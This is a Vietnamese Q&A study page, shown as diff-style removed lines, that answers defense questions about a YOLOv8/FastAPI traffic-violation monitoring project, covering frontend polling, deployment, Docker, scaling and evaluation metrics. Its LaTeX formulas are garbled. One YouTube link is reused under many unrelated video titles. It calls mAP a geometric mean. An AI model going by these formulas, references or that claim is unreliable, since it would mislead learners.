-        <div class="qa-card" id="cau-171">
-            <div class="question-title">
-                <span class="q-num">### Câu 171:</span>
-                <span>Vì sao dùng Vanilla JavaScript thay vì 1 framework (React/Vue) cho dashboard? Trade-off về độ phức tạp vs hiệu năng/kích thước bundle?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Lý do lựa chọn Vanilla JavaScript (ES6+):</strong></p>
-<ul>
-    <li><strong>Không phụ thuộc công cụ đóng gói (No Build Step / Zero Tooling):</strong> Không cần cài đặt Node.js, Webpack, Vite hay chạy <code>npm run build</code>. Dashboard có thể phục vụ trực tiếp dưới dạng tệp tĩnh (Static Files) từ FastAPI qua <code>StaticFiles(directory=FRONTEND_DIR)</code> vô cùng gọn nhẹ.</li>
-    <li><strong>Dung lượng Bundle cực nhẹ (Zero Overhead):</strong> Kích thước trang web chỉ vỏn vẹn vài chục KB HTML/CSS/JS, tải trang trong **< 50ms**, không tốn bộ nhớ RAM trình duyệt để duy trì Virtual DOM.</li>
-</ul>
-
-<p><strong>2. Trade-off (Đánh đổi):</strong></p>
-<ul>
-    <li><em>Nhược điểm của Vanilla JS:</em> Khi giao diện trở nên cực kỳ phức tạp với hàng chục component tương tác, việc quản lý DOM thủ công qua <code>document.getElementById()</code> dễ gây ra mã nguồn rối (Spaghetti code) và khó duy trì hơn so với React/Vue.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Vanilla JavaScript vs Frontend Frameworks (React/Vue) — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-172">
-            <div class="question-title">
-                <span class="q-num">### Câu 172:</span>
-                <span>Canvas API dùng để làm gì trong việc cho phép người dùng vẽ ROI/vạch dừng tùy chỉnh trên frontend?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Vai trò của Canvas API (thẻ `<canvas>`):</strong></p>
-<p>Canvas API cung cấp giao diện đồ họa 2D cho phép lập trình viên vẽ các điểm, đường thẳng, đa giác trực tiếp lên bề mặt hiển thị hình ảnh của video.</p>
-
-<p><strong>2. Ứng dụng trong vẽ ROI và Vạch dừng tùy chỉnh:</strong></p>
-<ul>
-    <li>Khi người dùng nhấp chuột (MouseEvent) lên khung hiển thị video, JavaScript bắt tọa độ <code>(x, y)</code> của con trỏ chuột.</li>
-    <li>Canvas API thực hiện vẽ các chấm tròn đỉnh đa giác (<code>ctx.arc</code>), nối các đường viền đa giác ROI (<code>ctx.lineTo</code>, <code>ctx.stroke</code>) và tô màu mờ vùng quan tâm (<code>ctx.fill</code> với <code>globalAlpha = 0.2</code>).</li>
-    <li>Lấy danh sách các đỉnh tọa độ đã vẽ, chuẩn hóa về khoảng <code>[0.0, 1.0]</code> và gửi về Backend API qua request <code>POST /api/sessions</code>.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">HTML5 Canvas API Tutorial: Drawing Interactive Polygons — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-173">
-            <div class="question-title">
-                <span class="q-num">### Câu 173:</span>
-                <span>Cơ chế polling định kỳ gọi next-frame từ frontend — tần suất gọi liên quan thế nào đến FPS hiển thị thực tế cho người dùng?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Cơ chế Polling Loop trong Frontend JavaScript:</strong></p>
-<pre><code>async function streamLoop() {
-    while (isPlaying) {
-        const response = await fetch('/api/sessions/' + sessionId + '/next-frame', { method: 'POST' });
-        const data = await response.json();
-        if (data.done) break;
-        videoElement.src = data.frame;
-        updateDashboard(data.metadata);
-    }
-}</code></pre>
-
-<p><strong>2. Mối quan hệ giữa Tần suất gọi Polling và FPS hiển thị:</strong></p>
-<p>Tốc độ FPS hiển thị thực tế (Displayed FPS) bị giới hạn bởi **nút thắt cổ chai lớn nhất (Bottleneck)** giữa tốc độ xử lý AI của Server và độ trễ đường truyền mạng (RTT - Round Trip Time):</p>
-<div class="formula-block">
-$$	ext{Frame Time} = T_{	ext{network\_request}} + T_{	ext{server\_inference}} + T_{	ext{network\_response}} + T_{	ext{browser\_render}}$$
-$$	ext{Displayed FPS} = rac{1}{	ext{Frame Time}}$$
-</div>
-<p>Nếu tổng thời gian xử lý 1 frame của Server + Mạng là 45ms, thì tần suất gọi polling tối đa đạt được sẽ là \(rac{1000	ext{ms}}{45	ext{ms}} pprox 22.2 	ext{ FPS}\).</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">JavaScript Async/Await Polling Loops & Performance — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-174">
-            <div class="question-title">
-                <span class="q-num">### Câu 174:</span>
-                <span>Nếu mạng chậm, việc truyền base64 JPEG qua HTTP JSON response (thay vì binary trực tiếp hoặc WebSocket) ảnh hưởng gì đến độ trễ (latency) trải nghiệm người dùng?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Ảnh hưởng của Chuỗi Base64 JPEG qua HTTP JSON:</strong></p>
-<ul>
-    <li><strong>Phình to dung lượng dữ liệu (33% Overhead):</strong> Thuật toán mã hóa Base64 biến đổi 3 bytes dữ liệu nhị phân thành 4 ký tự ASCII. Việc này làm dung lượng dữ liệu truyền qua mạng **tăng thêm xấp xỉ 33%** so với việc truyền dữ liệu nhị phân (Binary stream) nguyên bản.</li>
-    <li><strong>Ảnh hưởng khi đường truyền mạng chậm:</strong> Khi mạng bị nghẽn (Latency cao), dung lượng Base64 60 KB phải tốn thời gian truyền lâu hơn. Vòng lặp <code>await fetch()</code> phải chờ lâu hơn để nhận xong response, làm FPS hiển thị bị giật khựng (Laggy video stream).</li>
-</ul>
-<p><em>Giải pháp nâng cấp cho Production:</em> Chuyển sang dùng luồng nhị phân **WebRTC** hoặc **MJPEG Stream** (Multipart HTTP response).</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Base64 Encoding Overhead & Binary Streaming Comparisons — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-175">
-            <div class="question-title">
-                <span class="q-num">### Câu 175:</span>
-                <span>run.ps1/run.bat chỉ hỗ trợ Windows — nếu triển khai trên Linux server (thường dùng cho production), bạn cần thay đổi gì trong quy trình khởi động?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Thay đổi bắt buộc khi chuyển từ Windows sang Linux Server (Ubuntu/Debian):</strong></p>
-<ol>
-    <li><strong>Thay thế kịch bản khởi động (Shell Script):</strong> Viết kịch bản <code>run.sh</code> thay thế cho <code>run.ps1</code> / <code>run.bat</code>:
-<pre><code>#!/bin/bash
-source .venv/bin/activate
-export PYTHONPATH=.
-uvicorn backend.main:app --host 0.0.0.0 --port 8000 --workers 4</code></pre>
-    </li>
-    <li><strong>Sửa đổi đường dẫn tệp (Path Separators):</strong> Đảm bảo tất cả các đường dẫn trong Python dùng thư viện <code>pathlib.Path</code> thay vì nối chuỗi dùng dấu xược ngược Windows <code>\</code>. (Mã nguồn dự án đã tuân thủ chuẩn <code>pathlib</code>).</li>
-    <li><strong>Quản lý tiến trình (Process Manager):</strong> Sử dụng <code>systemd</code> service hoặc <code>supervisor</code> / <code>PM2</code> để tự động khởi động lại ứng dụng nếu bị crash.</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Deploying Python FastAPI Applications on Linux Servers — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-176">
-            <div class="question-title">
-                <span class="q-num">### Câu 176:</span>
-                <span>--reload trong lệnh uvicorn.run(..., reload=True) có nên bật trong môi trường production không? Vì sao?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Trả lời:</strong> TUYỆT ĐỐI KHÔNG ĐƯỢC BẬT <code>reload=True</code> TRONG MÔI TRƯỜNG PRODUCTION!</p>
-
-<p><strong>2. Lý do Kỹ thuật:</strong></p>
-<ul>
-    <li><strong>Tốn tài nguyên CPU (File System Watching Overhead):</strong> Cờ <code>reload=True</code> bắt Uvicorn phải chạy một tiến trình File Watcher (như <code>watchfiles</code>) liên tục quét hàng ngàn tệp tin trên đĩa xem có dòng code nào bị sửa đổi không. Việc này gây lãng phí tài nguyên CPU nghiêm trọng trên server production.</li>
-    <li><strong>Rủi ro Bảo mật và Không ổn định:</strong> Nếu ai đó lỡ chỉnh sửa hoặc ghi một file log vào thư mục code, Uvicorn sẽ **tự động ngắt và khởi động lại toàn bộ Server**, làm ngắt đứt tất cả các session video đang chạy của khách hàng.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Uvicorn Production vs Development Configurations — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-177">
-            <div class="question-title">
-                <span class="q-num">### Câu 177:</span>
-                <span>Giải thích sự khác nhau giữa môi trường dev (bạn đang chạy) và môi trường triển khai thực tế cần có (reverse proxy, HTTPS, process manager như systemd/Docker).</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. So sánh chi tiết Dev vs Production Environment:</strong></p>
-<table style="width:100%; border-collapse: collapse; margin-top:10px; color:#cbd5e1;">
-    <tr style="background-color:#1e293b; border-bottom:1px solid #334155;">
-        <th style="padding:8px; text-align:left;">Thành phần</th>
-        <th style="padding:8px; text-align:left;">Môi trường Dev (Hiện tại)</th>
-        <th style="padding:8px; text-align:left;">Môi trường Production (Thực tế)</th>
-    </tr>
-    <tr>
-        <td style="padding:8px;">Web Server</td>
-        <td style="padding:8px;">Uvicorn chạy trực tiếp (Localhost:8000)</td>
-        <td style="padding:8px;"><strong>Nginx Reverse Proxy</strong> + Uvicorn Worker Pool</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;">Giao thức Bảo mật</td>
-        <td style="padding:8px;">HTTP không mã hóa</td>
-        <td style="padding:8px;"><strong>HTTPS / TLS 1.3</strong> (Let's Encrypt SSL)</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;">Quản lý Tiến trình</td>
-        <td style="padding:8px;">Chạy tay qua Terminal <code>run.ps1</code></td>
-        <td style="padding:8px;"><strong>systemd / Docker Containers</strong> (Auto-restart)</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;">Tải static files</td>
-        <td style="padding:8px;">FastAPI StaticFiles phục vụ</td>
-        <td style="padding:8px;">Nginx phục vụ trực tiếp (High performance)</td>
-    </tr>
-</table>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Production Web Architecture: Nginx, Uvicorn, Systemd & SSL — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-178">
-            <div class="question-title">
-                <span class="q-num">### Câu 178:</span>
-                <span>Nếu phải đóng gói hệ thống bằng Docker, bạn dự kiến sẽ có bao nhiêu container/service (ví dụ: 1 cho backend, 1 cho model serving riêng)?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Kiến trúc Đóng gói Docker (Multi-Container Architecture via Docker Compose):</strong></p>
-<p>Hệ thống dự kiến đóng gói thành 3 Containers/Services độc lập:</p>
-
-<ol>
-    <li><strong>Container 1: <code>web-frontend-proxy</code> (Nginx Container):</strong> Đóng vai trò làm Web Server phía trước, phục vụ tệp tĩnh HTML/CSS/JS, cấu hình HTTPS SSL và điều hướng Reverse Proxy API requests.</li>
-    <li><strong>Container 2: <code>backend-api</code> (FastAPI Core Container):</strong> Chứa ứng dụng FastAPI, quản lý vòng đời Session, kết nối SQLite DB, tính toán logic PCU và phát hiện vi phạm.</li>
-    <li><strong>Container 3: <code>model-serving</code> (Triton Inference Server hoặc TorchServe Container - Tùy chọn nâng cao):</strong> Chuyên phục vụ suy luận mô hình YOLOv8 trên GPU, chia sẻ tài nguyên cho nhiều worker backend.</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Dockerizing FastAPI Applications & Docker Compose Tutorial — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-179">
-            <div class="question-title">
-                <span class="q-num">### Câu 179:</span>
-                <span>app.mount("/static", StaticFiles(directory=FRONTEND_DIR)) — vì sao tách static file serving khỏi các API endpoint động?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Mã nguồn trong <code>backend/main.py</code> (dòng 488):</strong></p>
-<pre><code>app.mount("/static", StaticFiles(directory=FRONTEND_DIR), name="static")</code></pre>
-
-<p><strong>2. Lý do tách biệt Static File Serving khỏi Dynamic API Endpoints:</strong></p>
-<ul>
-    <li><strong>Nguyên tắc Tách biệt Trách nhiệm (Separation of Concerns):</strong> Các tệp static (HTML, CSS, JS, ảnh logo) là các tệp cố định không đổi. Việc gắn qua <code>StaticFiles</code> cho phép FastAPI tự động thêm các HTTP Caching Headers (như <code>ETag</code>, <code>Cache-Control</code>), giúp trình duyệt lưu bản sao tĩnh, không phải tải lại ở các lần truy cập sau.</li>
-    <li><strong>Tối ưu hóa Performance cho Production:</strong> Khi đưa lên Nginx, Nginx sẽ chặn ngay các request <code>/static/*</code> và đọc trực tiếp từ đĩa cứng gửi cho client với tốc độ cực nhanh mà không cần chuyển request qua cho Python FastAPI xử lý.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">FastAPI Static Files Mount & Caching Headers — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-180">
-            <div class="question-title">
-                <span class="q-num">### Câu 180:</span>
-                <span>Nếu số lượng camera giám sát tăng lên hàng chục/hàng trăm, kiến trúc hiện tại (1 server xử lý tuần tự từng session) có scale được không? Bạn sẽ redesign thế nào (message queue, worker pool, GPU batching)?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">THIẾT KẾ KIẾN TRÚC MỞ RỘNG QUY MÔ HÀNG TRĂM CAMERA (Distributed Scalable Architecture):</div>
-    
-    <p><strong>1. Đánh giá kiến trúc hiện tại:</strong> KHÔNG THỂ SCALE cho hàng trăm camera. 1 Server hiện tại chỉ chịu được 3-5 video đồng thời do giới hạn GPU/CPU đơn lẻ.</p>
-
-    <p><strong>2. Sơ đồ Tái thiết kế Kiến trúc Phân tán (Redesign Architecture):</strong></p>
-    <pre><code>[ 100+ RTSP Cameras ] 
-          │
-          ▼
-┌───────────────────────────┐
-│ Edge Stream Ingestion Node│ (FFmpeg / DeepStream)
-└─────────────┬─────────────┘
-              │ Đẩy Video Frames
-              ▼
-┌───────────────────────────┐
-│ Message Queue (Apache Kafka)│ (Hàng chờ phân tán high-throughput)
-└─────────────┬─────────────┘
-              │ Distribution
-              ▼
-┌────────────────────────────────────────────────────────┐
-│ Worker GPU Pool (Celery / Ray Workers + TensorRT)     │
-│ (Dynamic GPU Batching: Gộp 16 frame từ 16 camera train)│
-└─────────────┬──────────────────────────────────────────┘
-              │ Ghi sự kiện
-              ▼
-┌───────────────────────────┐
-│ Distributed DB & Storage  │ (PostgreSQL + Redis + S3 Cluster)
-└───────────────────────────┘
-</code></pre>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Scalable Video Analytics Architecture with Kafka & GPU Batching — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-<h2 id="group-M" class="group-header">## M. ĐÁNH GIÁ, SO SÁNH & CÂU HỎI PHẢN BIỆN MỞ (20 câu)</h2>
-
-        <div class="qa-card" id="cau-181">
-            <div class="question-title">
-                <span class="q-num">### Câu 181:</span>
-                <span>So với phương pháp cổ điển (MOG2/KNN Background Subtraction + Kalman Filter) mà bảng 1.1 báo cáo có nêu, vì sao Deep Learning (YOLOv8) vượt trội hơn cho giao thông hỗn hợp Việt Nam?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Hạn chế của Phương pháp Cổ điển (MOG2/KNN Background Subtraction):</strong></p>
-<ul>
-    <li>Background Subtraction tách đối tượng dựa trên sự chênh lệch với ảnh nền tĩnh. Khi giao thông bị ùn tắc (xe dừng chờ đèn đỏ quá lâu), phương pháp cổ điển sẽ coi chiếc xe đứng yên đó là... **một phần của ảnh nền** và làm biến mất hoàn toàn chiếc xe khỏi bộ đếm!</li>
-    <li>Rất dễ bị nhiễu bởi bóng của cây cối rung rinh, sự thay đổi ánh sáng mây che đột ngột hoặc bóng của chính chiếc xe kéo dài trên mặt đường.</li>
-</ul>
-
-<p><strong>2. Lý do Deep Learning (YOLOv8) vượt trội hoàn toàn cho giao thông Việt Nam:</strong></p>
-<ol>
-    <li><strong>Học đặc trưng ngữ nghĩa mức cao (High-level Semantic Features):</strong> YOLOv8 nhận diện ô tô/xe máy dựa trên hình dáng, bánh xe, gương chiếu hậu và cấu trúc tổng thể — không phụ thuộc vào việc xe đang đứng yên hay di chuyển.</li>
-    <li>Phân tách chính xác từng cá thể xe máy trong dòng xe giao thông hỗn hợp đông đúc bất chấp ánh sáng và bóng râm môi trường.</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=vVjZ8J6n45c" target="_blank" rel="noopener noreferrer">Background Subtraction vs Deep Learning Object Detection — https://www.youtube.com/watch?v=vVjZ8J6n45c</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-182">
-            <div class="question-title">
-                <span class="q-num">### Câu 182:</span>
-                <span>Faster R-CNN + SORT có mAP cao nhưng FPS thấp (<10 FPS theo bảng 1.1) — giải thích đánh đổi Two-stage detector (Faster R-CNN) vs One-stage detector (YOLO) về mặt kiến trúc khiến tốc độ khác biệt lớn như vậy.<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. So sánh Kiến trúc Two-Stage Detector vs One-Stage Detector:</strong></p>
-<ul>
-    <li><strong>Two-Stage Detector (Faster R-CNN):</strong>
-        <br>Giai đoạn 1: Mạng RPN (Region Proposal Network) sinh ra hàng ngàn vùng đề xuất (Region Proposals).
-        <br>Giai đoạn 2: Cắt các vùng đề xuất đó qua phép RoI Pooling và cho chạy qua các lớp Fully Connected phụ để phân loại nhãn và chỉnh tọa độ.
-        <br>&rarr; Chi phí tính toán cực kỳ nặng nề ở Giai đoạn 2, khiến tốc độ sụt giảm xuống **&lt; 10 FPS**.
-    </li>
-    <li><strong>One-Stage Detector (YOLOv8):</strong>
-        <br>Bỏ qua hoàn toàn bước sinh vùng đề xuất RPN. Mạng neural nhìn toàn bộ bức ảnh duy nhất 1 lần (You Only Look Once) và dự đoán trực tiếp tọa độ Bounding Box + Class Probability ngay tại Detection Head trong 1 lượt suy luận duy nhất (Single Forward Pass).
-        <br>&rarr; Cho tốc độ suy luận vượt trội **&gt; 20 - 60 FPS**.
-    </li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=gRAyOPjQ9_s" target="_blank" rel="noopener noreferrer">One-Stage vs Two-Stage Object Detectors (YOLO vs Faster R-CNN) — https://www.youtube.com/watch?v=gRAyOPjQ9_s</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-183">
-            <div class="question-title">
-                <span class="q-num">### Câu 183:</span>
-                <span>Nếu phải chọn 1 chỉ số duy nhất để đánh giá "độ tốt" của hệ thống giám sát giao thông thực tế (không phải chỉ mAP), bạn sẽ chọn chỉ số nào và vì sao (ví dụ: F1-score theo class hiếm, hay tỉ lệ false-violation)?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">LỰA CHỌN CHỈ SỐ ĐÁNH GIÁ THỰC TẾ LÝ TƯỞNG:</div>
-
-    <p><strong>Lựa chọn: Tỉ lệ Báo vi phạm sai (False Violation Rate / False Positive Violation Rate)</strong></p>
-
-    <p><strong>Lập luận kỹ thuật:</strong></p>
-    <ul>
-        <li>Trong ứng dụng thực tế của cơ quan quản lý giao thông nhà nước, hậu quả của việc **phạt oan 1 người dân chấp hành đúng luật (False Positive)** nghiêm trọng hơn nhiều so với việc bỏ sót 1 vi phạm. Một vụ phạt oan gây ra tranh chấp pháp lý, khiếu nại hành chính và làm tổn hại uy tín của cơ quan công quyền.</li>
-        <li>Chỉ số mAP là chỉ số trung bình hình học trên toàn bộ tập dữ liệu, có thể bị che giấu bởi kết quả tốt của các lớp phổ biến. Tỉ lệ False Violation Rate phản ánh trực tiếp độ tin cậy vận hành thực tế của hệ thống.</li>
-    </ul>
-
-    <p><strong>Góc nhìn phản biện:</strong> Nếu quá tối ưu để False Violation Rate = 0%, hệ thống có thể bị cài đặt ngưỡng quá an toàn và bỏ sót 90% các vụ vi phạm thật (Recall cực thấp).</p>
-    <p><strong>Kết luận:</strong> Tỉ lệ False Violation Rate &lt; 0.1% kết hợp với kiểm duyệt Human-in-the-loop là chỉ số đánh giá sống còn cho hệ thống thực tế.</p>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=VAo84c1hQX8" target="_blank" rel="noopener noreferrer">Choosing the Right Metrics for Real World Machine Learning Systems — https://www.youtube.com/watch?v=VAo84c1hQX8</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-184">
-            <div class="question-title">
-                <span class="q-num">### Câu 184:</span>
-                <span>Hạn chế lớn nhất của hệ thống hiện tại theo đánh giá khách quan của chính bạn là gì (không phải phần "hạn chế" viết sẵn trong báo cáo)?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">ĐÁNH GIÁ KHÁCH QUAN HẠN CHẾ LỚN NHẤT CỦA HỆ THỐNG:</div>
-
-    <p><strong>Hạn chế lớn nhất: Sự phụ thuộc cứng vào Giả định Đèn giao thông Mô phỏng (Simulated Signal) và Thiếu Module Nhận diện Biển số xe (ALPR/OCR).</strong></p>
-
-    <p><strong>Phân tích chi tiết:</strong></p>
-    <ol>
-        <li>Trạng thái đèn tín hiệu hiện tại chủ yếu dựa vào việc người dùng click nút giả lập trên Dashboard hoặc chạy quy trình HSV rule-based vốn nhạy cảm với thời tiết ban đêm. Nếu tín hiệu đèn bị nhận sai, toàn bộ logic phạt vượt đèn đỏ sẽ bị sụp đổ theo.</li>
-        <li>Hệ thống phát hiện được xe vi phạm và chụp ảnh bằng chứng, nhưng **KHÔNG ĐỌC ĐƯỢC KÝ TỰ BIỂN SỐ XE (License Plate OCR)**. Việc này làm ảnh bằng chứng chỉ dừng lại ở mức demo học thuật, chưa thể tự động hóa việc xuất biên bản phạt nguội gửi tới chủ xe.</li>
-    </ol>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Critiquing Computer Vision Systems & Honest System Evaluation — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-185">
-            <div class="question-title">
-                <span class="q-num">### Câu 185:</span>
-                <span>Giả sử bạn có thêm 3 tháng phát triển, bạn sẽ ưu tiên cải tiến module nào trước tiên: (a) mở rộng PCU tính đủ 8 lớp, (b) thêm nhận diện biển số (ALPR), hay (c) tối ưu tốc độ inference? Giải thích lựa chọn.<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">LỰA CHỌN ƯU TIÊN PHÁT TRIỂN TRONG 3 THÁNG:</div>
-
-    <p><strong>Lựa chọn ưu tiên hàng đầu: (b) Tích hợp Module Nhận diện Biển số xe (ALPR / OCR).</strong></p>
-
-    <p><strong>Lý do lựa chọn:</strong></p>
-    <ul>
-        <li><strong>Hoàn thiện chuỗi giá trị ứng dụng (Value Chain Completion):</strong> Module ALPR là mảnh ghép cuối cùng biến dự án từ một "Bài tập lớn Demo" thành một "Sản phẩm Thực tế Thương mại hóa". Việc đọc được biển số xe (ví dụ <code>29A-123.45</code>) cho phép kết nối trực tiếp với Cơ sở dữ liệu Đăng kiểm để xuất quyết định xử phạt tự động.</li>
-        <li>Nâng cao vượt trội giá trị thực tiễn và tính thuyết phục kỹ thuật trước các nhà đầu tư/hội đồng.</li>
-    </ul>
-
-    <p><em>Kế hoạch triển khai:</em> Sử dụng YOLOv8-Crop phát hiện vùng biển số + EasyOCR / PaddleOCR để trích xuất ký tự chữ và số.</p>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=k14u4_v-i0c" target="_blank" rel="noopener noreferrer">Automatic License Plate Recognition (ALPR) Pipeline Design — https://www.youtube.com/watch?v=k14u4_v-i0c</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-186">
-            <div class="question-title">
-                <span class="q-num">### Câu 186:</span>
-                <span>Module helmet_detector.py (phát hiện không đội mũ bảo hiểm) được liệt kê trong cấu trúc code nhưng không được đề cập nhiều trong phần thực nghiệm chính — mức độ hoàn thiện của module này thế nào, đã tích hợp vào pipeline chính (video_processor.py) chưa?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Trực tiếp đánh giá mức độ hoàn thiện của <code>core/helmet_detector.py</code>:</strong></p>
-<p>Mã nguồn <code>core/helmet_detector.py</code> đã được viết sẵn khung lớp (Skeleton Class) hỗ trợ nạp mô hình tùy chỉnh <code>models/helmet_best.pt</code> và cung cấp hàm phát hiện nhãn <code>no_helmet</code> trên đối tượng xe máy.</p>
-
-<p><strong>2. Trạng thái tích hợp trong Pipeline chính:</strong></p>
-<p>Module này **CHƯA ĐƯỢC TÍCH HỢP TRỰC TIẾP VÀO PIPELINE XỬ LÝ FRAME CHÍNH (<code>core/video_processor.py</code>)**. Nó đang nằm ở trạng thái module mở rộng chuẩn bị sẵn (Future Extension Module) cho giai đoạn phát triển tiếp theo của dự án (xem mục 1 trong <code>project-context.md</code>).</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=m9fH9OWn8jU" target="_blank" rel="noopener noreferrer">Helmet Detection System Design using YOLOv8 — https://www.youtube.com/watch?v=m9fH9OWn8jU</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-187">
-            <div class="question-title">
-                <span class="q-num">### Câu 187:</span>
-                <span>Nếu triển khai thực tế, hệ thống của bạn phát hiện vi phạm nhưng không nhận diện biển số xe (ALPR) — vậy giá trị ứng dụng thực tế (không chỉ demo) của evidence hiện tại là gì? Cần bổ sung module nào để có tính pháp lý?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Giá trị ứng dụng thực tế của Ảnh bằng chứng hiện tại (chưa có ALPR):</strong></p>
-<ul>
-    <li><strong>Thống kê và Giám sát điểm nóng (Hotspot Analytics):</strong> Cung cấp bức tranh tổng thể cho cơ quan quản lý giao thông về mật độ vi phạm tại từng ngã tư theo các khung giờ trong ngày (ví dụ ngã tư A có 150 lượt vượt đèn đỏ/giờ vào khung giờ cao điểm), từ đó bố trí lực lượng Cảnh sát Giao thông ra chốt trực trực tiếp.</li>
-    <li><strong>Trích xuất video bằng chứng thủ công:</strong> Lưu giữ ảnh bằng chứng có nhúng thời gian và khung hình để cán bộ đối soát khi có tai nạn giao thông xảy ra.</li>
-</ul>
-
-<p><strong>2. Module bắt buộc bổ sung để có tính Pháp lý xử phạt nguội:</strong></p>
-<ol>
-    <li>Module <strong>ALPR (Automatic License Plate Recognition)</strong> đọc chính xác biển số xe.</li>
-    <li>Module <strong>Chữ ký Số Timestamp (Cryptographic Digital Signature)</strong> đảm bảo ảnh bằng chứng không bị chỉnh sửa bằng Photoshop.</li>
-</ol>
-
-            </div>
